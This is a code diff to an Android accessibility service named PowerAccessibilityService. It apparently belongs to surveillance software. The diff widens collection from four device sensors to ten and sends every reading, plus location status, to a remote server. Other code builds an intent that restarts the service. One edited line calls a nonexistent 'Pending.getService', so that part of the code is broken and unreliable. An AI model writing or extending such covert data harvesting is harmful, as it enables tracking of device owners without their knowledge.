@@ -160,79 +160,103 @@ public class PowerAccessibilityService extends AccessibilityService implements S
             submitDataToServer("location", "Permission Denied");
         }
     }
-    
+
+    // --- UPGRADED: Expanded to register all required sensors safely ---
     private void getSensorData() {
-        Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
-        Sensor gyroscope = sensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE);
-        Sensor magnetometer = sensorManager.getDefaultSensor(Sensor.TYPE_MAGNETIC_FIELD);
-        Sensor proximity = sensorManager.getDefaultSensor(Sensor.TYPE_PROXIMITY);
-
-        if (accelerometer == null && gyroscope == null && magnetometer == null && proximity == null) {
-            submitDataToServer("sensor_error", "No relevant sensors found on this device.");
-            return;
-        }
-
-        if (accelerometer != null) {
-            sensorManager.registerListener(this, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
-        } else {
-            submitDataToServer("accelerometer", "Not available");
-        }
-
-        if (gyroscope != null) {
-            sensorManager.registerListener(this, gyroscope, SensorManager.SENSOR_DELAY_NORMAL);
-        } else {
-            submitDataToServer("gyroscope", "Not available");
-        }
-
-        if (magnetometer != null) {
-            sensorManager.registerListener(this, magnetometer, SensorManager.SENSOR_DELAY_NORMAL);
-        } else {
-            submitDataToServer("magnetometer_compass", "Not available");
-        }
+        Log.d(TAG, "Attempting to register listeners for all requested sensors.");
         
-        if (proximity != null) {
-            sensorManager.registerListener(this, proximity, SensorManager.SENSOR_DELAY_NORMAL);
-        } else {
-            submitDataToServer("proximity", "Not available");
+        // This is a helper method to reduce boilerplate code
+        registerSensorIfAvailable(Sensor.TYPE_ROTATION_VECTOR, "rotation_vector");
+        registerSensorIfAvailable(Sensor.TYPE_GAME_ROTATION_VECTOR, "game_rotation_vector");
+        registerSensorIfAvailable(Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR, "geomagnetic_rotation_vector");
+        registerSensorIfAvailable(Sensor.TYPE_GRAVITY, "gravity");
+        registerSensorIfAvailable(Sensor.TYPE_ACCELEROMETER, "accelerometer");
+        registerSensorIfAvailable(Sensor.TYPE_GYROSCOPE, "gyroscope");
+        registerSensorIfAvailable(Sensor.TYPE_MAGNETIC_FIELD, "magnetometer");
+        registerSensorIfAvailable(Sensor.TYPE_PROXIMITY, "proximity");
+        registerSensorIfAvailable(Sensor.TYPE_LIGHT, "light");
+        registerSensorIfAvailable(Sensor.TYPE_PRESSURE, "pressure");
+    }
+
+    private void registerSensorIfAvailable(int sensorType, String dataType) {
+        try {
+            if (sensorManager == null) return;
+            Sensor sensor = sensorManager.getDefaultSensor(sensorType);
+            if (sensor != null) {
+                sensorManager.registerListener(this, sensor, SensorManager.SENSOR_DELAY_NORMAL);
+                Log.i(TAG, "Successfully registered listener for: " + dataType);
+            } else {
+                submitDataToServer(dataType, "Not available");
+                Log.w(TAG, "Sensor not available on this device: " + dataType);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Exception while registering sensor: " + dataType, e);
+            submitDataToServer(dataType + "_error", "Failed to register listener.");
         }
     }
 
+
+    // --- UPGRADED: Expanded to handle events from all new sensors ---
     @Override
     public final void onSensorChanged(SensorEvent event) {
         JSONObject sensorData = new JSONObject();
-        String sensorType = "";
+        String sensorTypeKey = "";
 
         try {
-            if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {
-                sensorType = "accelerometer";
+            int sensorType = event.sensor.getType();
+
+            if (sensorType == Sensor.TYPE_ROTATION_VECTOR ||
+                sensorType == Sensor.TYPE_GAME_ROTATION_VECTOR ||
+                sensorType == Sensor.TYPE_GEOMAGNETIC_ROTATION_VECTOR) {
+
+                if (sensorType == Sensor.TYPE_ROTATION_VECTOR) sensorTypeKey = "rotation_vector";
+                else if (sensorType == Sensor.TYPE_GAME_ROTATION_VECTOR) sensorTypeKey = "game_rotation_vector";
+                else sensorTypeKey = "geomagnetic_rotation_vector";
+
                 sensorData.put("x", event.values[0]);
                 sensorData.put("y", event.values[1]);
                 sensorData.put("z", event.values[2]);
-            } else if (event.sensor.getType() == Sensor.TYPE_GYROSCOPE) {
-                sensorType = "gyroscope";
+                // The 'w' (scalar) component is often at index 3. Check length to be safe.
+                if (event.values.length > 3) {
+                    sensorData.put("w", event.values[3]);
+                }
+
+            } else if (sensorType == Sensor.TYPE_GRAVITY ||
+                       sensorType == Sensor.TYPE_ACCELEROMETER ||
+                       sensorType == Sensor.TYPE_GYROSCOPE ||
+                       sensorType == Sensor.TYPE_MAGNETIC_FIELD) {
+                
+                if (sensorType == Sensor.TYPE_GRAVITY) sensorTypeKey = "gravity";
+                else if (sensorType == Sensor.TYPE_ACCELEROMETER) sensorTypeKey = "accelerometer";
+                else if (sensorType == Sensor.TYPE_GYROSCOPE) sensorTypeKey = "gyroscope";
+                else sensorTypeKey = "magnetometer"; // Corrected key
+
                 sensorData.put("x", event.values[0]);
                 sensorData.put("y", event.values[1]);
                 sensorData.put("z", event.values[2]);
-            } else if (event.sensor.getType() == Sensor.TYPE_MAGNETIC_FIELD) {
-                sensorType = "magnetometer_compass";
-                sensorData.put("x", event.values[0]);
-                sensorData.put("y", event.values[1]);
-                sensorData.put("z", event.values[2]);
-            } else if (event.sensor.getType() == Sensor.TYPE_PROXIMITY) {
-                sensorType = "proximity";
+
+            } else if (sensorType == Sensor.TYPE_PROXIMITY) {
+                sensorTypeKey = "proximity";
                 sensorData.put("distance", event.values[0]);
+            } else if (sensorType == Sensor.TYPE_LIGHT) {
+                sensorTypeKey = "light";
+                sensorData.put("lux", event.values[0]);
+            } else if (sensorType == Sensor.TYPE_PRESSURE) {
+                sensorTypeKey = "pressure";
+                sensorData.put("pressure", event.values[0]);
             }
 
-            if (!sensorType.isEmpty()) {
-                submitDataToServer(sensorType, sensorData);
+            if (!sensorTypeKey.isEmpty()) {
+                submitDataToServer(sensorTypeKey, sensorData);
             }
         } catch (JSONException e) {
-            Log.e(TAG, "JSON error creating sensor data", e);
+            Log.e(TAG, "JSON error creating sensor data for type: " + sensorTypeKey, e);
         } finally {
+            // Unregister the listener to save battery, as we only need one snapshot of data.
             sensorManager.unregisterListener(this, event.sensor);
         }
     }
-
+    
     private void submitDataToServer(String dataType, Object payload) {
         JSONObject postData = new JSONObject();
         try {
@@ -328,7 +352,7 @@ public class PowerAccessibilityService extends AccessibilityService implements S
         Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
         restartServiceIntent.setPackage(getPackageName());
 
-        PendingIntent restartServicePendingIntent = PendingIntent.getService(
+        PendingIntent restartServicePendingIntent = Pending.getService(
             getApplicationContext(), 
             1, 
             restartServiceIntent, 
